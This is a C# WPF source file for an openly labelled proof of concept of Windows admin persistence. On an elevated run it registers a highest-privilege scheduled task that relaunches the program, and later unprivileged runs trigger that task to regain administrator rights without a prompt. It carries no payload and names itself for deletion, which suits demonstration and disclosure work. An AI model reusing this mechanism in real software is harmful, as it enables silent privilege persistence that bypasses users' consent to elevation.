using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows;
using Microsoft.Win32.TaskScheduler;
using Trigger = System.Windows.Trigger;

namespace windows_admin_persistence_demo
{
    
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {

        public static string PeristenceServiceName = "PersistentAdminVulnerabilityDeleteMe";
        
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static bool PersistenceTaskExists()
        {
            using var taskService = new TaskService();
            return taskService.GetTask($"\\{PeristenceServiceName}") != null;
        }

        public static void CreatePersistenceTask()
        {
            using var taskService = new TaskService();
            var taskDefinition = taskService.NewTask();
            taskDefinition.RegistrationInfo.Description =
                "This is used for a POC of admin persistence on Windows. Delete this task if you are not actively using the POC.";
            taskDefinition.Actions.Add(new ExecAction(Process.GetCurrentProcess().MainModule.FileName));
            taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
            taskService.RootFolder.RegisterTaskDefinition(PeristenceServiceName, taskDefinition);
        }

        public static void RunPersistenceTask()
        {
            using var taskService = new TaskService();
            taskService.GetTask($"\\{PeristenceServiceName}").Run();
        }
        
        public static void DeletePersistenceTask()
        {
            using var taskService = new TaskService();
            taskService.RootFolder.DeleteTask(PeristenceServiceName, exceptionOnNotExists:false);
        }
        
        protected override void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);
            string mainWindowText;
            if (IsAdministrator())
            {
                mainWindowText = "Running as admin";
                DeletePersistenceTask();
                CreatePersistenceTask();
            }
            else
            {
                if (PersistenceTaskExists())
                {
                    RunPersistenceTask();
                    Environment.Exit(0);
                }
                mainWindowText = "Running without admin. Have you run me as admin once already?";
            }
            var mainWindow = new MainWindow("Admin Persistence Demo", mainWindowText);
            mainWindow.WindowState = WindowState.Minimized;
            mainWindow.Show();
            mainWindow.WindowState = WindowState.Normal;
        }
    }
}